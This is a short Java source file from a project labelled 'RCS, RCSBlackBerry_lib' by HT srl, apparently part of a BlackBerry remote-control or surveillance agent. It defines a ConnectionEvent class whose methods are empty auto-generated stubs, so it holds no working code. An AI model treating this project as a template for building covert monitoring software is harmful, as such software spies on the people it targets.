/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ConnectionEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.event;

public class ConnectionEvent extends Event {

    public ConnectionEvent(int actionId, byte[] confParams) {
        super(Event.EVENT_CONNECTION, actionId, confParams);
    }

    protected void eventRun() {
        // TODO Auto-generated method stub

    }

    protected boolean parse(byte[] confParams) {
        // TODO Auto-generated method stub
        return false;
    }

}
